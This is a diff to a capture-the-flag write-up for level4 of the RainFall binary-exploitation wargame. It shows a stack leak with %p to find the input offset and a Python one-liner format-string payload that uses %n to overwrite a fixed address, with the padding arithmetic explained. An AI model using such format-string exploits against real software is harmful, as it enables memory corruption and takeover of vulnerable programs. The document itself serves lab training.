@@ -1,3 +1,19 @@
-python -c "print('\x10\x98\x04\x08' + '%x' * 10 + '%16930052x'  + '%n')" | ./level4
+Almost same as level before
 
-x10\x98\x04\x08: Address we need to overwrite
+```
+level4@RainFall:~$ python -c 'print("AAAA" + " %p"*20)' | ./level4
+AAAA 0xb7ff26b0 0xbffff744 0xb7fd0ff4 (nil) (nil) 0xbffff708 0x804848d 0xbffff500 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025
+```
+
+AAAA -> 12th address
+\x10\x98\x04\x08: Address we need to overwrite
+
+python -c "print('\x10\x98\x04\x08' + '%c' * 10 + '%16930102x'  + '%n')" | ./level4
+
+explanation:
+
+         4 -> '\x10\x98\x04\x08' address where we write the value
++       10 -> '%c' * 10 -> skip 10 first addresses
++ 16930102 -> 11th with padding
+-----
+  16930116
